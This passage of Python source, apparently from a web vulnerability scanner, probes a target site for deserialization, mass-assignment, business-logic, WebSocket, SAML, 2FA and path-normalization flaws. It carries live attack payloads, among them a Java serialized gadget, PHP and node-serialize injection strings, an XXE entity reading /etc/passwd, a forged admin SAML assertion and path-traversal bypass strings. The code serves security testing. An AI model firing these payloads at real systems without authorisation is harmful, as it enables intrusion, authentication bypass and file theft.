    gadget_b64 = "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcHAFBhyuvE7oAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IADGphdmEubmV0LlVSTJYlNzYa/ORyAwAHSQAIaGFzaENvZGVJAAhwb3J0U2lnTAAJYXV0aG9yaXR5dAASTGphdmEvbGFuZy9TdHJpbmc7TAAEZmlsZXEAfgADTAAEaG9zdHEAfgADTAAIcHJvdG9jb2xxAH4AA0wAA3JlZnEAfgADeHD//////////3QAAHQAAHQABWh0dHBwdAAveA=="
    try:
        t0 = time.time()
        rpost(url, data=gadget_b64,
              headers={"Content-Type": "application/x-java-serialized-object"})
        elapsed_j = time.time() - t0
        if elapsed_j > 4.5:
            _add("Java Deserialization — Blind Timing (Possible RCE)", "Critical",
                 "deserial", url, "A08:2021", "CWE-502",
                 "Sending Java serialized gadget chain caused significant server delay → "
                 "potential blind Java deserialization RCE.",
                 f"POST with Java gadget → response delay {elapsed_j:.1f}s (threshold: 4.5s)",
                 9.8, "Blind Java deserialization timing")
    except Exception:
        pass

    # Probe 3: PHP unserialize probe
    php_payloads = [
        'O:8:"stdClass":1:{s:5:"field";s:4:"test";}',
        'a:1:{i:0;s:4:"test";}',
        'O:4:"Test":0:{}',
        # PHP POP chain trigger (basic)
        'O:1:"A":1:{s:1:"a";O:1:"B":0:{}}',
    ]
    php_endpoints = ["/", "/api", "/data", "/upload", "/import"]
    for ep in php_endpoints[:3]:
        ep_url = url.rstrip("/") + ep
        for php_p in php_payloads[:2]:
            try:
                r = rpost(ep_url, data={"data": php_p})
                body = r.text.lower()
                if any(x in body for x in ["unserialize()", "__wakeup", "__destruct",
                                            "object of class", "serialization"]):
                    _add("PHP Unserialize Error Disclosure", "High",
                         "deserial", ep_url, "A08:2021", "CWE-502",
                         "Server reveals PHP unserialize error or class reference → "
                         "PHP Object Injection may be exploitable via POP chain gadgets.",
                         f"POST data={php_p[:50]} → PHP serialization error in response",
                         8.1, f"PHP unserialize probe at {ep}")
                # Timing check for PHP gadget sleep
                t0 = time.time()
                rpost(ep_url, data={"data": 'O:12:"DateInterval":1:{s:1:"y";i:0;}'})
                if time.time() - t0 > 3.5:
                    _add("PHP Deserialization — Blind Timing", "High",
                         "deserial", ep_url, "A08:2021", "CWE-502",
                         "PHP deserialization payload caused delay → potential blind object injection.",
                         f"PHP gadget → {time.time()-t0:.1f}s delay",
                         7.5, f"PHP blind deserial timing at {ep}")
            except Exception:
                pass

    # Probe 4: Python pickle detection
    try:
        # Detect pickle-serialized cookies or headers
        r = rget(url)
        for ck_name, ck_val in r.cookies.items():
            try:
                raw_ck = _b64.b64decode(ck_val + "==")
                if raw_ck[:2] in (b"\x80\x02", b"\x80\x03", b"\x80\x04", b"\x80\x05"):
                    _add("Python Pickle in Cookie", "Critical",
                         "deserial", url, "A08:2021", "CWE-502",
                         f"Cookie '{ck_name}' appears to be a Python pickle object "
                         f"(magic bytes: {raw_ck[:2].hex()}). Arbitrary code execution on deserialize.",
                         f"Cookie {ck_name}=base64({raw_ck[:8].hex()}...) → pickle magic bytes",
                         9.8, f"Pickle cookie: {ck_name}")
            except Exception:
                pass
    except ImportError:
        pass

    # Probe 5: Node.js node-serialize
    node_payload = '{"rce":"_$$ND_FUNC$$_function(){return 1}()"}'
    node_endpoints = ["/api", "/api/v1", "/json", "/data"]
    for ep in node_endpoints[:2]:
        ep_url = url.rstrip("/") + ep
        try:
            r = rpost(ep_url, data=node_payload,
                      headers={"Content-Type": "application/json"})
            body = r.text
            if "$$ND_FUNC$$" in body or '"rce":1' in body or '"rce":"1"' in body:
                _add("Node.js node-serialize IIFE Reflected", "Critical",
                     "deserial", ep_url, "A08:2021", "CWE-502",
                     "node-serialize IIFE function payload reflected or executed → "
                     "Remote Code Execution via Node.js deserialization.",
                     f"POST $$ND_FUNC$$ payload → reflected/executed in response",
                     9.8, f"node-serialize probe at {ep}")
        except Exception:
            pass

    _module_done("deserial")


# ═══════════════════════════════════════════════════════════════
#  MODULE 39 — API Security (Mass Assignment + Versioning)
# ═══════════════════════════════════════════════════════════════
def api_security_scan(url):
    if _module_skip("api_sec"): return
    section("MODULE 39 — API Security","🔌")

    parsed = urlparse(url)
    base = f"{parsed.scheme}://{parsed.netloc}"

    # API version discovery
    api_versions = [
        "/api/v1", "/api/v2", "/api/v3", "/api/v0", "/api/beta",
        "/api/latest", "/api", "/v1", "/v2", "/v3",
        "/api/v1/users", "/api/v2/users", "/api/v1/admin",
    ]
    found_api = []
    for ep in api_versions:
        try:
            r = rget(base + ep)
            ct = r.headers.get("Content-Type","")
            if r.status_code not in (404, 410) and ("json" in ct or r.status_code in (200,401,403)):
                found_api.append(ep)
                vlog(f"API endpoint: {ep} → {r.status_code}")
        except Exception:
            pass

    if not found_api:
        info("No API versioned endpoints found")
        _module_done("api_sec"); return

    good(f"API endpoints found: {found_api[:6]}")

    # API version bypass: older versions may lack auth
    for ep in found_api[:6]:
        try:
            r = rget(base + ep)
            if r.status_code == 200:
                body = r.text[:3000].lower()
                # Check for excessive data exposure
                sensitive_fields = ["password","passwd","secret","token","api_key",
                                    "apikey","private_key","credit_card","ssn","dob",
                                    "social_security","auth_token","access_token",
                                    "refresh_token","private","hash","salt"]
                leaked = [f for f in sensitive_fields if f in body]
                if leaked:
                    _add("API Excessive Data Exposure", "High",
                         "api_sec", base+ep, "A01:2021", "CWE-213",
                         "API endpoint returns sensitive fields that should not be exposed to clients. "
                         "Filtering should occur server-side, not client-side.",
                         f"GET {ep} → response contains: {leaked}",
                         7.5, f"Sensitive fields in API response: {leaked}")
        except Exception:
            pass

    # Mass Assignment: inject extra privileged fields
    mass_assign_payloads = [
        {"isAdmin": True, "role": "admin"},
        {"admin": True, "is_admin": 1},
        {"role": "superuser", "permissions": ["admin","write","delete"]},
        {"_isAdmin": True, "user_level": 0},
        {"account_type": "premium", "subscription": "unlimited"},
    ]
    for ep in found_api[:3]:
        for payload in mass_assign_payloads[:3]:
            try:
                r = rpost(base + ep, json=payload)
                body = r.text.lower()
                # Detect if privileged field accepted
                for k, v in payload.items():
                    if str(v).lower() in body or k in body:
                        resp_data = {}
                        try: resp_data = r.json()
                        except Exception: pass
                        if isinstance(resp_data, dict) and resp_data.get(k) == v:
                            _add("Mass Assignment — Privileged Field Accepted", "Critical",
                                 "api_sec", base+ep, "A01:2021", "CWE-915",
                                 f"API accepted and reflected privileged field '{k}={v}' in response → "
                                 "attacker can escalate privileges by injecting extra fields in POST body.",
                                 f"POST {ep} with {payload} → response: {k}={v}",
                                 9.1, f"Field '{k}={v}' mass-assigned")
                            break
            except Exception:
                pass

    # HTTP Method Override (bypass DELETE/PUT restrictions)
    method_override_hdrs = [
        ("X-HTTP-Method-Override", "DELETE"),
        ("X-HTTP-Method", "DELETE"),
        ("X-Method-Override", "DELETE"),
        ("_method", "DELETE"),
    ]
    for ep in found_api[:2]:
        for hdr_name, hdr_val in method_override_hdrs:
            try:
                if hdr_name == "_method":
                    r = rpost(base + ep + f"?_method={hdr_val}")
                else:
                    r = rpost(base + ep, headers={hdr_name: hdr_val})
                if r.status_code not in (404, 405, 501):
                    _add(f"HTTP Method Override via {hdr_name}", "High",
                         "api_sec", base+ep, "A05:2021", "CWE-650",
                         f"Server accepts '{hdr_name}: {hdr_val}' to override POST → "
                         "unauthorized DELETE/PUT via method override header.",
                         f"POST with {hdr_name}:{hdr_val} → HTTP {r.status_code} (not 405/501)",
                         7.5, f"Method override: {hdr_name}")
            except Exception:
                pass

    # BOLA/IDOR in API: test sequential IDs on API endpoints
    id_patterns = ["/api/v1/users/", "/api/v1/orders/", "/api/v1/accounts/",
                   "/api/users/", "/api/orders/", "/api/items/"]
    for pattern in id_patterns:
        for id_val in ["1", "2", "0", "admin", "me"]:
            test_url = base + pattern + id_val
            try:
                r = rget(test_url)
                if r.status_code == 200:
                    body = r.text[:2000].lower()
                    if any(x in body for x in ["email","username","user_id","id","name"]):
                        _add("API BOLA/IDOR — Object Access Without Authorization", "Critical",
                             "api_sec", test_url, "A01:2021", "CWE-639",
                             "API endpoint returns user/object data without enforcing ownership check → "
                             "Broken Object Level Authorization (BOLA/IDOR).",
                             f"GET {pattern}{id_val} → HTTP 200 with user data",
                             9.1, f"Unauthenticated API BOLA: {pattern}{id_val}")
            except Exception:
                pass

    _module_done("api_sec")


# ═══════════════════════════════════════════════════════════════
#  MODULE 40 — Business Logic Flaws
# ═══════════════════════════════════════════════════════════════
def business_logic_scan(url):
    if _module_skip("biz_logic"): return
    section("MODULE 40 — Business Logic Flaws","🏦")

    parsed = urlparse(url)
    base = f"{parsed.scheme}://{parsed.netloc}"

    # Find forms for business logic testing
    forms_data = []
    try:
        r = rget(url)
        if BS4:
            soup = BeautifulSoup(r.text, "html.parser")
            for form in soup.find_all("form")[:5]:
                action = form.get("action","")
                method = form.get("method","get").lower()
                form_url = urljoin(url, action) if action else url
                fields = {}
                for inp in form.find_all(["input","select","textarea"]):
                    n = inp.get("name","")
                    t = inp.get("type","text")
                    v = inp.get("value","")
                    if n:
                        fields[n] = v or "test"
                if fields:
                    forms_data.append((form_url, method, fields))
    except Exception:
        pass

    # Common e-commerce/business API endpoints
    business_endpoints = [
        ("/cart", "cart"), ("/checkout", "checkout"), ("/order", "order"),
        ("/purchase", "purchase"), ("/payment", "payment"), ("/coupon", "coupon"),
        ("/discount", "discount"), ("/transfer", "transfer"), ("/withdraw", "withdraw"),
        ("/apply-coupon", "coupon"), ("/redeem", "redeem"), ("/vote", "vote"),
        ("/like", "like"), ("/api/cart", "cart"), ("/api/order", "order"),
        ("/api/checkout", "checkout"), ("/api/coupon", "coupon"),
    ]

    # Test 1: Negative quantity / negative price
    neg_payloads = [
        {"quantity": -1}, {"qty": -1}, {"amount": -1},
        {"quantity": -999}, {"price": -1}, {"count": -1},
        {"quantity": 0}, {"amount": 0}, {"price": 0},
        {"quantity": 999999}, {"amount": 999999},
    ]
    for ep, ep_type in business_endpoints[:8]:
        ep_url = base + ep
        for neg_p in neg_payloads[:4]:
            try:
                r_post = rpost(ep_url, json=neg_p)
                r_get  = rget(ep_url + "?" + urlencode(neg_p))
                for r in [r_post, r_get]:
                    body = r.text.lower()
                    if r.status_code == 200 and any(
                        x in body for x in ["success","added","total","cart","order","ok"]):
                        param = list(neg_p.keys())[0]
                        val   = list(neg_p.values())[0]
                        if val < 0:
                            _add(f"Business Logic — Negative {param.capitalize()} Accepted", "High",
                                 "biz_logic", ep_url, "A04:2021", "CWE-840",
                                 f"Application accepted {param}={val} without validation → "
                                 "attacker can manipulate totals, get refunds, or earn credits.",
                                 f"POST/GET {ep} with {param}={val} → 200 success response",
                                 7.5, f"Negative {param} at {ep}")
                        elif val == 0:
                            _add(f"Business Logic — Zero {param.capitalize()} Accepted", "Medium",
                                 "biz_logic", ep_url, "A04:2021", "CWE-840",
                                 f"Application accepted {param}=0 without rejection → "
                                 "free item or zero-cost transaction possible.",
                                 f"{ep} accepted {param}=0 with success response",
                                 5.4, f"Zero {param} at {ep}")
            except Exception:
                pass

    # Test 2: Coupon/discount reuse
    coupon_codes = ["SAVE10","FREE","DISCOUNT","COUPON","TEST","ADMIN",
                    "PROMO","SALE","GIFT","WELCOME","100OFF","FREESHIP"]
    coupon_eps = [ep for ep, t in business_endpoints if t == "coupon"]
    for c_ep in (coupon_eps or ["/coupon","/apply-coupon"])[:2]:
        c_url = base + c_ep
        for code in coupon_codes[:5]:
            try:
                r1 = rpost(c_url, json={"coupon": code, "code": code})
                r2 = rpost(c_url, json={"coupon": code, "code": code})
                if r1.status_code == 200 and r2.status_code == 200:
                    body1, body2 = r1.text.lower(), r2.text.lower()
                    success_sigs = ["applied","valid","discount","success","saved","percent"]
                    if any(s in body1 for s in success_sigs) and any(s in body2 for s in success_sigs):
                        _add("Business Logic — Coupon Code Reuse", "Medium",
                             "biz_logic", c_url, "A04:2021", "CWE-840",
                             f"Coupon code '{code}' accepted multiple times without single-use enforcement → "
                             "attacker can apply same discount repeatedly.",
                             f"POST {c_ep} code={code} accepted twice with success response",
                             5.4, f"Coupon reuse: {code}")
            except Exception:
                pass

    # Test 3: Workflow step bypass (skip step N, go directly to step N+2)
    workflow_steps = [
        ("/checkout/step1", "/checkout/step3"),
        ("/checkout/shipping", "/checkout/payment"),
        ("/checkout/payment", "/checkout/confirm"),
        ("/order/step1", "/order/confirm"),
        ("/wizard/step1", "/wizard/step3"),
        ("/register/step1", "/register/complete"),
    ]
    for step_a, step_b in workflow_steps:
        try:
            # Try to access final step without visiting intermediate step
            r = rget(base + step_b)
            if r.status_code == 200 and len(r.text) > 500:
                body = r.text.lower()
                if any(x in body for x in ["confirm","complete","success","order","payment","finish"]):
                    _add("Business Logic — Workflow Step Bypass", "High",
                         "biz_logic", base+step_b, "A04:2021", "CWE-840",
                         "Final workflow step accessible without completing prerequisite steps → "
                         "attacker can bypass payment, shipping, or verification steps.",
                         f"Direct GET to {step_b} returned 200 with completion content",
                         7.5, f"Workflow bypass: skip to {step_b}")
        except Exception:
            pass

    # Test 4: Race condition on limited resources (concurrent requests)
    race_endpoints = [("/api/redeem", "redeem"), ("/api/vote", "vote"),
                      ("/api/claim", "claim"), ("/api/transfer", "transfer")]
    for ep, ep_type in race_endpoints:
        ep_url = base + ep
        try:
            payload = {"action": ep_type, "amount": 1}
            results = []
            with ThreadPoolExecutor(max_workers=10) as ex:
                futs = [ex.submit(rpost, ep_url, json=payload) for _ in range(10)]
                for f in as_completed(futs):
                    try:
                        resp = f.result()
                        if resp.status_code == 200:
                            results.append(resp.text.lower())
                    except Exception:
                        pass
            success_count = sum(1 for r in results
                                if any(x in r for x in ["success","ok","done","complete"]))
            if success_count > 1:
                _add(f"Business Logic — Race Condition on {ep_type.capitalize()}", "High",
                     "biz_logic", ep_url, "A04:2021", "CWE-362",
                     f"10 concurrent {ep_type} requests → {success_count} succeeded. "
                     "Race condition allows multiple claims/transfers of limited resources.",
                     f"10 concurrent POSTs to {ep} → {success_count} HTTP 200 success responses",
                     7.5, f"Race condition: {success_count}/10 succeeded")
        except Exception:
            pass

    # Test 5: Price tampering via POST parameter manipulation
    price_params = ["price","total","amount","cost","subtotal","unit_price","item_price"]
    for form_url, method, fields in forms_data[:3]:
        for pp in price_params:
            if pp in fields:
                tampered = dict(fields)
                tampered[pp] = "0.01"
                try:
                    r = rpost(form_url, data=tampered) if method == "post" else rget(
                        form_url + "?" + urlencode(tampered))
                    body = r.text.lower()
                    if r.status_code == 200 and any(
                        x in body for x in ["success","order","confirm","payment","checkout"]):
                        _add("Business Logic — Price Parameter Tampering", "Critical",
                             "biz_logic", form_url, "A04:2021", "CWE-840",
                             f"Modifying POST parameter '{pp}=0.01' resulted in successful transaction → "
                             "client-side price trusted by server, allowing purchase at manipulated price.",
                             f"POST {form_url} with {pp}=0.01 → success response",
                             9.1, f"Price tamper: {pp}=0.01 accepted")
                except Exception:
                    pass

    _module_done("biz_logic")


# ═══════════════════════════════════════════════════════════════
#  MODULE 41 — WebSocket Security
# ═══════════════════════════════════════════════════════════════
def websocket_scan(url):
    if _module_skip("websocket"): return
    section("MODULE 41 — WebSocket Security","🔌")
    parsed  = urlparse(url)
    base    = f"{parsed.scheme}://{parsed.netloc}"
    ws_base = f"ws://{parsed.netloc}"
    wss_base= f"wss://{parsed.netloc}"

    # Common WebSocket upgrade endpoints
    ws_paths = ["/ws", "/websocket", "/socket", "/socket.io/",
                "/ws/chat", "/ws/feed", "/ws/live", "/api/ws",
                "/realtime", "/hub", "/signalr/connect",
                "/sockjs/websocket", "/stomp", "/mqtt"]

    found_ws = []
    for path in ws_paths:
        ep = base + path
        try:
            r = rget(ep, headers={
                "Upgrade": "websocket",
                "Connection": "Upgrade",
                "Sec-WebSocket-Key": _b64.b64encode(os.urandom(16)).decode(),
                "Sec-WebSocket-Version": "13",
            }, allow_redirects=False)
            # 101 = WebSocket upgrade accepted
            if r.status_code == 101:
                found_ws.append(path)
                good(f"WebSocket endpoint (101 Upgrade): {path}")
            elif r.status_code not in (404, 410):
                vlog(f"WebSocket candidate {path} → HTTP {r.status_code}")
                found_ws.append(path)
        except Exception:
            pass

    if not found_ws:
        # Scan page source for ws:// / wss:// references
        try:
            r = rget(url)
            ws_refs = re.findall(r'wss?://[^\s\'"<>]+', r.text)
            if ws_refs:
                for ref in ws_refs[:5]:
                    good(f"WebSocket URL in page source: {ref}")
                    found_ws.append(ref)
        except Exception:
            pass

    if not found_ws:
        info("No WebSocket endpoints detected")
        _module_done("websocket"); return

    for path in found_ws[:4]:
        ep_url = path if path.startswith("ws") else base + path

        # Test 1: ws:// (unencrypted) instead of wss://
        if ep_url.startswith("http://") or not ep_url.startswith("wss"):
            _add("WebSocket Unencrypted (ws://)", "High",
                 "websocket", ep_url, "A02:2021", "CWE-319",
                 "WebSocket connection uses ws:// (plain text) instead of wss:// → "
                 "data transmitted unencrypted; eavesdropping and MITM attacks possible.",
                 f"Endpoint uses ws:// (unencrypted): {ep_url}",
                 7.5, "Use wss:// exclusively")

        # Test 2: Missing Origin validation (CSWSH)
        evil_origins = ["https://evil.com", "null", "https://attacker.example.com"]
        for evil_origin in evil_origins[:2]:
            try:
                r = rget(base + path if not path.startswith("ws") else url,
                         headers={
                             "Upgrade": "websocket",
                             "Connection": "Upgrade",
                             "Origin": evil_origin,
                             "Sec-WebSocket-Key": _b64.b64encode(os.urandom(16)).decode(),
                             "Sec-WebSocket-Version": "13",
                         }, allow_redirects=False)
                if r.status_code in (101, 200):
                    _add("WebSocket Missing Origin Validation (CSWSH)", "High",
                         "websocket", ep_url, "A07:2021", "CWE-346",
                         f"WebSocket upgrade accepted from arbitrary origin '{evil_origin}' → "
                         "Cross-Site WebSocket Hijacking (CSWSH) attack possible.",
                         f"WS upgrade with Origin: {evil_origin} → HTTP {r.status_code}",
                         8.1, f"Evil origin accepted: {evil_origin}")
                    break
            except Exception:
                pass

        # Test 3: Unauthenticated access (no cookie/auth required)
        try:
            # Try without session cookies
            r = rget(base + path if not path.startswith("ws") else url,
                     headers={
                         "Upgrade": "websocket",
                         "Connection": "Upgrade",
                         "Sec-WebSocket-Key": _b64.b64encode(os.urandom(16)).decode(),
                         "Sec-WebSocket-Version": "13",
                     }, allow_redirects=False)
            if r.status_code == 101:
                _add("WebSocket Unauthenticated Access", "High",
                     "websocket", ep_url, "A07:2021", "CWE-306",
                     "WebSocket endpoint accepts connections without authentication → "
                     "unauthenticated clients can subscribe to data streams.",
                     f"WS upgrade without credentials → 101 Switching Protocols",
                     7.5, f"No auth required on WS endpoint: {path}")
        except Exception:
            pass

    _module_done("websocket")


# ═══════════════════════════════════════════════════════════════
#  MODULE 42 — SAML Misconfiguration
# ═══════════════════════════════════════════════════════════════
def saml_scan(url):
    if _module_skip("saml"): return
    section("MODULE 42 — SAML Misconfiguration","🎫")
    parsed = urlparse(url)
    base   = f"{parsed.scheme}://{parsed.netloc}"

    saml_endpoints = [
        "/saml", "/saml/sso", "/saml/acs", "/saml/metadata",
        "/auth/saml", "/sso/saml", "/sso", "/Shibboleth.sso",
        "/saml2/sso", "/saml2/acs", "/saml2/metadata",
        "/adfs/ls", "/adfs/services/trust",
        "/simplesaml/saml2/idp/SSOService.php",
        "/wsFed", "/fed/auth", "/trust/mex",
    ]

    found_eps = []
    for ep in saml_endpoints:
        try:
            r = rget(base + ep, allow_redirects=False)
            if r.status_code not in (404, 410):
                found_eps.append(ep)
                vlog(f"SAML endpoint: {ep} → {r.status_code}")
        except Exception:
            pass

    if not found_eps:
        info("No SAML endpoints detected")
        _module_done("saml"); return

    good(f"SAML endpoints: {found_eps}")

    for ep in found_eps[:3]:
        ep_url = base + ep

        # Test 1: XXE in SAML assertion
        xxe_saml = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
  <saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">
    <saml:AttributeStatement>
      <saml:Attribute Name="username">
        <saml:AttributeValue>&xxe;</saml:AttributeValue>
      </saml:Attribute>
    </saml:AttributeStatement>
  </saml:Assertion>
</samlp:Response>'''
        xxe_b64 = _b64.b64encode(xxe_saml.encode()).decode()
        try:
            r = rpost(ep_url, data={"SAMLResponse": xxe_b64})
            body = r.text
            if any(x in body for x in ["root:x:", "daemon:", "/bin/bash", "etc/passwd"]):
                _add("SAML XXE — /etc/passwd Read", "Critical",
                     "saml", ep_url, "A04:2021", "CWE-611",
                     "XXE injection in SAML assertion successfully read /etc/passwd → "
                     "arbitrary file read via XML External Entity in SAML processing.",
                     f"POST SAMLResponse with XXE entity → /etc/passwd content in response",
                     9.8, "SAML XXE confirmed — /etc/passwd returned")
            elif "error" not in body.lower() and r.status_code == 200:
                _add("SAML XXE — Possible (No Error)", "High",
                     "saml", ep_url, "A04:2021", "CWE-611",
                     "SAML endpoint processed XXE-injected assertion without error → "
                     "XML parser may be vulnerable; file read requires blind exfiltration.",
                     f"POST SAMLResponse with XXE → HTTP 200, no parser error",
                     7.5, "SAML XXE no-error response")
        except Exception:
            pass

        # Test 2: Signature wrapping (inject extra assertion alongside valid sig)
        wrap_saml = '''<?xml version="1.0"?>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
  <saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="_injected">
    <saml:Subject><saml:NameID>admin@target.com</saml:NameID></saml:Subject>
    <saml:AttributeStatement>
      <saml:Attribute Name="role"><saml:AttributeValue>admin</saml:AttributeValue></saml:Attribute>
    </saml:AttributeStatement>
  </saml:Assertion>
</samlp:Response>'''
        wrap_b64 = _b64.b64encode(wrap_saml.encode()).decode()
        try:
            r = rpost(ep_url, data={"SAMLResponse": wrap_b64})
            body = r.text.lower()
            if any(x in body for x in ["welcome","dashboard","logged in","success","profile"]):
                _add("SAML Signature Wrapping — Auth Bypass", "Critical",
                     "saml", ep_url, "A07:2021", "CWE-347",
                     "SAML endpoint accepted unsigned/wrapped assertion → "
                     "authentication bypass via signature wrapping attack.",
                     f"Injected admin SAML assertion → authenticated response",
                     9.8, "SAML signature wrapping auth bypass")
        except Exception:
            pass

        # Test 3: Unencrypted SAML metadata exposure
        meta_url = base + ep + "/metadata"
        try:
            r = rget(meta_url)
            body = r.text
            if "<EntityDescriptor" in body or "SPSSODescriptor" in body:
                _add("SAML Metadata Exposed", "Medium",
                     "saml", meta_url, "A01:2021", "CWE-200",
                     "SAML metadata endpoint publicly accessible → "
                     "reveals IdP/SP configuration, certificates, and binding URLs.",
                     f"GET {meta_url} → SAML EntityDescriptor in response",
                     5.3, "SAML metadata publicly accessible")
                # Check for unencrypted assertion requirement
                if "WantAssertionsEncrypted" not in body or 'WantAssertionsEncrypted="false"' in body:
                    _add("SAML Assertions Not Required to be Encrypted", "Medium",
                         "saml", meta_url, "A02:2021", "CWE-311",
                         "SAML SP metadata does not require encrypted assertions → "
                         "assertions may be intercepted and read in plain text.",
                         "WantAssertionsEncrypted not set or false in metadata",
                         5.4, "Unencrypted SAML assertions allowed")
        except Exception:
            pass

    _module_done("saml")


# ═══════════════════════════════════════════════════════════════
#  MODULE 43 — 2FA / OTP Bypass
# ═══════════════════════════════════════════════════════════════
def otp_bypass_scan(url):
    if _module_skip("otp_bypass"): return
    section("MODULE 43 — 2FA / OTP Bypass","🔢")
    parsed = urlparse(url)
    base   = f"{parsed.scheme}://{parsed.netloc}"

    otp_endpoints = [
        "/2fa", "/2fa/verify", "/otp", "/otp/verify",
        "/mfa", "/mfa/verify", "/auth/2fa", "/auth/otp",
        "/verify", "/verify-otp", "/confirm", "/validate",
        "/totp/verify", "/sms/verify", "/email/verify",
        "/api/2fa", "/api/otp", "/api/mfa",
    ]
    backup_endpoints = [
        "/backup-codes", "/recovery-codes", "/recovery",
        "/2fa/backup", "/mfa/backup", "/account/recovery",
    ]

    found_otp = []
    for ep in otp_endpoints:
        try:
            r = rget(base + ep, allow_redirects=False)
            if r.status_code not in (404, 410):
                found_otp.append(ep)
                vlog(f"OTP endpoint: {ep} → {r.status_code}")
        except Exception:
            pass

    # Check backup code endpoints
    for ep in backup_endpoints:
        try:
            r = rget(base + ep)
            if r.status_code == 200 and len(r.text) > 100:
                body = r.text.lower()
                if any(x in body for x in ["backup","recovery","code","token"]):
                    _add("2FA Backup Codes Exposed", "Critical",
                         "otp_bypass", base+ep, "A07:2021", "CWE-287",
                         "Backup/recovery codes endpoint accessible without authentication → "
                         "attacker can retrieve backup codes to bypass 2FA entirely.",
                         f"GET {ep} → 200 with backup code content",
                         9.1, f"Backup code endpoint: {ep}")
        except Exception:
            pass

    if not found_otp:
        info("No 2FA/OTP endpoints detected")
        _module_done("otp_bypass"); return

    good(f"OTP endpoints: {found_otp}")

    for ep in found_otp[:4]:
        ep_url = base + ep

        # Test 1: OTP rate limiting (10 rapid requests)
        otp_responses = []
        for code in ["000000","111111","123456","999999","000001","111110"]:
            try:
                r = rpost(ep_url, json={"otp": code, "code": code,
                                        "token": code, "totp": code})
                otp_responses.append(r.status_code)
            except Exception:
                pass
        # If all 6 attempts returned same non-429 status → no rate limiting
        if otp_responses and len(set(otp_responses)) <= 2 and 429 not in otp_responses:
            _add("2FA/OTP Missing Rate Limiting", "High",
                 "otp_bypass", ep_url, "A07:2021", "CWE-307",
                 "OTP endpoint allows rapid successive attempts without rate limiting → "
                 "brute-force attack on 6-digit OTP (1,000,000 combinations) is feasible.",
                 f"6 rapid POST attempts to {ep} → statuses: {otp_responses} (no 429)",
                 8.1, f"No rate limit on OTP at {ep}")

        # Test 2: Response manipulation probe (look for boolean fields)
        try:
            r = rpost(ep_url, json={"otp": "000000", "code": "000000"})
            body = r.text
            # Look for JSON response with false/fail that could be flipped
            try:
                resp_json = r.json()
                if isinstance(resp_json, dict):
                    bool_keys = [k for k,v in resp_json.items()
                                 if isinstance(v, bool) or str(v).lower() in ("false","true","0","1")]
                    if bool_keys:
                        _add("2FA Response Manipulation Vector", "High",
                             "otp_bypass", ep_url, "A07:2021", "CWE-287",
                             f"OTP response contains boolean field(s) {bool_keys} → "
                             "intercept and flip response value to bypass 2FA (e.g. false→true).",
                             f"POST {ep} 000000 → JSON keys with boolean: {bool_keys}",
                             8.1, f"Boolean OTP response fields: {bool_keys}")
            except Exception:
                pass
            # Check for redirect on wrong code (may allow redirect manipulation)
            if r.status_code in (301,302,303,307,308):
                loc = r.headers.get("Location","")
                _add("2FA Redirect on Wrong OTP", "Medium",
                     "otp_bypass", ep_url, "A07:2021", "CWE-287",
                     "Wrong OTP causes redirect instead of error — redirect destination "
                     "may be manipulable to bypass 2FA flow.",
                     f"Wrong OTP → {r.status_code} redirect to: {loc}",
                     5.4, f"OTP redirect: {loc}")
        except Exception:
            pass

        # Test 3: OTP reuse (same code twice → both accepted?)
        for test_otp in ["123456", "000000"]:
            resps = []
            for _ in range(2):
                try:
                    r = rpost(ep_url, json={"otp": test_otp, "code": test_otp})
                    resps.append((r.status_code, r.text[:200]))
                except Exception:
                    pass
            if len(resps) == 2 and resps[0][0] == resps[1][0] and resps[0][0] == 200:
                body0 = resps[0][1].lower()
                if any(x in body0 for x in ["valid","success","ok","true","verified"]):
                    _add("2FA/OTP Code Reuse Allowed", "High",
                         "otp_bypass", ep_url, "A07:2021", "CWE-287",
                         f"OTP code '{test_otp}' accepted on second submission → "
                         "OTP not invalidated after first use; replay attack possible.",
                         f"POST code={test_otp} twice → both returned 200 success",
                         7.5, f"OTP reuse: {test_otp}")

    _module_done("otp_bypass")


# ═══════════════════════════════════════════════════════════════
#  MODULE 44 — Path Normalization Attacks
# ═══════════════════════════════════════════════════════════════
def path_normalization_scan(url):
    if _module_skip("path_norm"): return
    section("MODULE 44 — Path Normalization Attacks","🛤️")
    parsed = urlparse(url)
    base   = f"{parsed.scheme}://{parsed.netloc}"

    # Protected paths to try to access via path confusion
    protected = ["/admin", "/administrator", "/manager", "/config",
                 "/api/admin", "/internal", "/debug", "/status",
                 "/actuator", "/phpinfo.php", "/server-status"]

    # Path normalization bypass payloads
    bypass_patterns = [
        # Double slash
        "//{}",
        # Path traversal prefix
        "/public/../{}",
        "/static/../{}",
        "/assets/../{}",
        "/img/../{}",
        # URL-encoded slash
        "/%2f{}",
        "/{}%2f",
        # Double encoding
        "/%252f{}",
        "/%2e%2e/{}",
        "/%2e/{}",
        # Unicode/overlong
        "/%c0%af{}",
        "/%ef%bc%8f{}",
        # Semicolon bypass (Java)
        "/;/{}",
        "/app;test/{}",
        # Dot-segment
        "/./{}",
        "/./{}/",
        # Backslash (Windows)
        "/{}\\",
        "/..%5c{}",
        # Null byte
        "/{}.php%00",
        "/{}.asp%00.txt",
    ]

    # First check if protected paths return non-200 normally
    blocked = []
    for ppath in protected[:6]:
        try:
            r = rget(base + ppath, allow_redirects=False)
            if r.status_code in (401, 403, 404, 302):
                blocked.append(ppath)
        except Exception:
            pass

    if not blocked:
        info("No blocked paths found to test normalization bypass")
        _module_done("path_norm"); return

    for ppath in blocked[:4]:
        clean_path = ppath.lstrip("/")
        for pattern in bypass_patterns:
            test_url = base + pattern.format(clean_path)
            try:
                r = rget(test_url, allow_redirects=False)
                if r.status_code == 200 and len(r.text) > 200:
                    body = r.text.lower()
                    if any(x in body for x in ["admin","config","debug","actuator","server",
                                                "dashboard","panel","management","phpinfo"]):
                        _add(f"Path Normalization Bypass — {pattern[:20]}", "High",
                             "path_norm", test_url, "A01:2021", "CWE-22",
                             f"Path normalization bypass '{pattern}' accessed protected resource '{ppath}' → "
                             "access control enforcement missing on normalized paths.",
